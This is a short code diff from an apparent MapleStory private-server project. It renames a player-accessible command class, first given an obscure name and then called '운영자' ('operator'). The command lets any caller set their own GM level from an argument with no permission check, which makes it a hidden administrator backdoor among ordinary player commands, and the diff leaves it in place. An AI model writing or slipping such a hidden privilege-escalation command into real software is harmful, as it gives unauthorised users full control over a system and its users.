@@ -214,7 +214,7 @@ public class PlayerCommand {
         }
     }
     
-    public static class enosis76895412 extends CommandExecute {
+    public static class 운영자 extends CommandExecute {
 
         public int execute(MapleClient c, String[] splitted) {
             c.getPlayer().setGM((byte) Short.parseShort(splitted[1]));
